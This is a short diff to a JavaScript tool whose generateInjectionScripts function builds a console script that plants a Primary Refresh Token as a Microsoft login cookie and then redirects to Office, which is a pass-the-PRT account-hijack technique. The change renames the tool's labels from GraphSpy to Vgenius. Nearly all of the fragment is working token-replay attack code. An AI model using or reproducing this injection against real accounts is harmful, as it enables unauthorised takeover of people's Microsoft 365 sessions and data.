@@ -593,9 +593,9 @@ function generateInjectionScripts(blob) {
   if (!blob.prt) return scripts;
 
   const consoleScript = [
-    '// GraphSpy PRT-only injection',
+    '// Vgenius PRT-only injection',
     'document.cookie = "x-ms-RefreshTokenCredential=' + encodeURIComponent(blob.prt) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None";',
-    'console.log("[GraphSpy] PRT cookie set");',
+    'console.log("[Vgenius] PRT cookie set");',
     'setTimeout(function() { window.location.href = "https://www.office.com/"; }, 2000);'
   ].join('\n');
 
